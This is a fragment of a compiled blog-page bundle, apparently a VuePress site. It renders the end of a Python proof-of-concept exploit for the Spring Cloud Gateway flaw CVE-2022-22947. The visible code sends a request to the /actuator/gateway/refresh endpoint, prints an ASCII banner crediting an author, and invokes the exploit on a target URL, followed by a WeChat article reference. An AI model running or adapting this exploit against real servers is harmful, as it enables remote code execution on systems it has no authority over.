"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("+")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v('"/actuator/gateway/refresh"')]),t._v(" "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v("headers"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v("headers2"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n    "),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("print")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("re3"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("text"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n\n\n"),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("if")]),t._v(" __name__ "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("==")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v('"__main__"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v("\n  "),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("print")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token triple-quoted-string string"}},[t._v("'''   ██████  ██      ██ ████████        ████   ████   ████   ████         ████   ████   ████     ██  ██████\n  ██░░░░██░██     ░██░██░░░░░        █░░░ █ █░░░██ █░░░ █ █░░░ █       █░░░ █ █░░░ █ █░░░ █   █░█ ░░░░░░█\n ██    ░░ ░██     ░██░██            ░    ░█░█  █░█░    ░█░    ░█      ░    ░█░    ░█░█   ░█  █ ░█      ░█\n░██       ░░██    ██ ░███████  █████   ███ ░█ █ ░█   ███    ███  █████   ███    ███ ░ ████  ██████     █ \n░██        ░░██  ██  ░██░░░░  ░░░░░   █░░  ░██  ░█  █░░    █░░  ░░░░░   █░░    █░░   ░░░█  ░░░░░█     █  \n░░██    ██  ░░████   ░██             █     ░█   ░█ █      █            █      █        █       ░█    █   \n ░░██████    ░░██    ░████████      ░██████░ ████ ░██████░██████      ░██████░██████  █        ░█   █    \n  ░░░░░░      ░░     ░░░░░░░░       ░░░░░░  ░░░░  ░░░░░░ ░░░░░░       ░░░░░░ ░░░░░░  ░         ░   ░     \n ██                   ██                 ██                              \n░██       ██   ██    ░██                ░██                              \n░██      ░░██ ██     ░██ ██   ██  █████ ░██  ██  ██████  ███████   █████ \n░██████   ░░███      ░██░██  ░██ ██░░░██░██ ██  ██░░░░██░░██░░░██ ██░░░██\n░██░░░██   ░██    ██ ░██░██  ░██░██  ░░ ░████  ░██   ░██ ░██  ░██░███████\n░██  ░██   ██    ░░  ░██░██  ░██░██   ██░██░██ ░██   ░██ ░██  ░██░██░░░░ \n░██████   ██      ██ ███░░██████░░█████ ░██░░██░░██████  ███  ░██░░██████\n░░░░░    ░░      ░░ ░░░  ░░░░░░  ░░░░░  ░░  ░░  ░░░░░░  ░░░   ░░  ░░░░░░ \nusage: python3 test.py url\n'''")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n  "),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("if")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token builtin"}},[t._v("len")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("sys"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("argv"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("1")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v("\n    url "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" sys"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("argv"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("1")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v("\n    "),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("exec")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("url"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n  "),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("else")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v("\n    exit"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n")])]),t._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[t._v("1")]),n("br"),n("span",{staticClass:"line-number"},[t._v("2")]),n("br"),n("span",{staticClass:"line-number"},[t._v("3")]),n("br"),n("span",{staticClass:"line-number"},[t._v("4")]),n("br"),n("span",{staticClass:"line-number"},[t._v("5")]),n("br"),n("span",{staticClass:"line-number"},[t._v("6")]),n("br"),n("span",{staticClass:"line-number"},[t._v("7")]),n("br"),n("span",{staticClass:"line-number"},[t._v("8")]),n("br"),n("span",{staticClass:"line-number"},[t._v("9")]),n("br"),n("span",{staticClass:"line-number"},[t._v("10")]),n("br"),n("span",{staticClass:"line-number"},[t._v("11")]),n("br"),n("span",{staticClass:"line-number"},[t._v("12")]),n("br"),n("span",{staticClass:"line-number"},[t._v("13")]),n("br"),n("span",{staticClass:"line-number"},[t._v("14")]),n("br"),n("span",{staticClass:"line-number"},[t._v("15")]),n("br"),n("span",{staticClass:"line-number"},[t._v("16")]),n("br"),n("span",{staticClass:"line-number"},[t._v("17")]),n("br"),n("span",{staticClass:"line-number"},[t._v("18")]),n("br"),n("span",{staticClass:"line-number"},[t._v("19")]),n("br"),n("span",{staticClass:"line-number"},[t._v("20")]),n("br"),n("span",{staticClass:"line-number"},[t._v("21")]),n("br"),n("span",{staticClass:"line-number"},[t._v("22")]),n("br"),n("span",{staticClass:"line-number"},[t._v("23")]),n("br"),n("span",{staticClass:"line-number"},[t._v("24")]),n("br"),n("span",{staticClass:"line-number"},[t._v("25")]),n("br"),n("span",{staticClass:"line-number"},[t._v("26")]),n("br"),n("span",{staticClass:"line-number"},[t._v("27")]),n("br"),n("span",{staticClass:"line-number"},[t._v("28")]),n("br"),n("span",{staticClass:"line-number"},[t._v("29")]),n("br"),n("span",{staticClass:"line-number"},[t._v("30")]),n("br"),n("span",{staticClass:"line-number"},[t._v("31")]),n("br"),n("span",{staticClass:"line-number"},[t._v("32")]),n("br"),n("span",{staticClass:"line-number"},[t._v("33")]),n("br"),n("span",{staticClass:"line-number"},[t._v("34")]),n("br"),n("span",{staticClass:"line-number"},[t._v("35")]),n("br"),n("span",{staticClass:"line-number"},[t._v("36")]),n("br"),n("span",{staticClass:"line-number"},[t._v("37")]),n("br"),n("span",{staticClass:"line-number"},[t._v("38")]),n("br"),n("span",{staticClass:"line-number"},[t._v("39")]),n("br"),n("span",{staticClass:"line-number"},[t._v("40")]),n("br"),n("span",{staticClass:"line-number"},[t._v("41")]),n("br"),n("span",{staticClass:"line-number"},[t._v("42")]),n("br"),n("span",{staticClass:"line-number"},[t._v("43")]),n("br"),n("span",{staticClass:"line-number"},[t._v("44")]),n("br"),n("span",{staticClass:"line-number"},[t._v("45")]),n("br"),n("span",{staticClass:"line-number"},[t._v("46")]),n("br"),n("span",{staticClass:"line-number"},[t._v("47")]),n("br"),n("span",{staticClass:"line-number"},[t._v("48")]),n("br"),n("span",{staticClass:"line-number"},[t._v("49")]),n("br"),n("span",{staticClass:"line-number"},[t._v("50")]),n("br"),n("span",{staticClass:"line-number"},[t._v("51")]),n("br"),n("span",{staticClass:"line-number"},[t._v("52")]),n("br"),n("span",{staticClass:"line-number"},[t._v("53")]),n("br"),n("span",{staticClass:"line-number"},[t._v("54")]),n("br"),n("span",{staticClass:"line-number"},[t._v("55")]),n("br"),n("span",{staticClass:"line-number"},[t._v("56")]),n("br"),n("span",{staticClass:"line-number"},[t._v("57")]),n("br"),n("span",{staticClass:"line-number"},[t._v("58")]),n("br"),n("span",{staticClass:"line-number"},[t._v("59")]),n("br"),n("span",{staticClass:"line-number"},[t._v("60")]),n("br"),n("span",{staticClass:"line-number"},[t._v("61")]),n("br"),n("span",{staticClass:"line-number"},[t._v("62")]),n("br"),n("span",{staticClass:"line-number"},[t._v("63")]),n("br"),n("span",{staticClass:"line-number"},[t._v("64")]),n("br"),n("span",{staticClass:"line-number"},[t._v("65")]),n("br"),n("span",{staticClass:"line-number"},[t._v("66")]),n("br"),n("span",{staticClass:"line-number"},[t._v("67")]),n("br")])]),n("h2",{attrs:{id:"参考文章"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#参考文章"}},[t._v("#")]),t._v(" 参考文章")]),t._v(" "),n("a-alert",{attrs:{type:"success",message:"https://mp.weixin.qq.com/s/lKKOUvWqU1Qpexus5u_3Uw",description:"",showIcon:""}}),t._v(" "),n("br")],1)}),[],!1,null,null,null);s.default=e.exports}}]);